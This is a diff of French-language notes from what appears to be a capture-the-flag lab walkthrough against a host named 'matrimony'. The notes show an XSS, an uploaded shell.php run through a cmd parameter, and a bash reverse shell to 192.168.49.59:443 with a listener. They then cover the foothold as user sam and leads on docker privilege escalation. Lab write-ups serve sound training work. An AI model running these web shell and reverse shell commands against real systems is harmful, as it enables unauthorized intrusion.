@@ -48,6 +48,8 @@ Cherchons une RCE avec une page de contact avec Boostrap v4.2.1
 
 On trouve une XSS mais rien de concluant.
 
+------------------------------------------------------------------------------------------->
+
 regardons le port 53
 
 le serveur DNS tourne sur le port 53 via BIND
@@ -132,7 +134,7 @@ http://prod99.matrimony.off/profile/[17]/shell.php
 # 7) run command system command through /profile/[ID]/shell.php?cmd=[COMMAND]
 http://prod99.matrimony.off/profile/[17]/shell.php?cmd=[bash -c "bash -i >& /dev/tcp/192.168.49.59/443 0>&1"]
 
-
+---------------------------------------------------------------------------------------------------------------------------> 
 username : testtest 
 pwd : test
 test@gmail.com
@@ -148,6 +150,7 @@ je lance mon bash -c "bash -i >& /dev/tcp/192.168.49.59/443 0>&1" ici
 listening on [any] 443 ...
 ^C
 
+---------------------------------------------------------------------------------------------------------------------------->
 sam@matrimony:/var/www/matrimony/profile/17$
 
 sam@matrimony:/home/sam$ cat local.txt
@@ -228,4 +231,9 @@ su: user CTF does not exist
 
 ok ça ne fonctionne pas, ok fausse piste.
 
+------------------------------------------------------------------------------------------->
+
 On voit dans /var/run que la machine tourne sous docker
+
+https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
+https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security
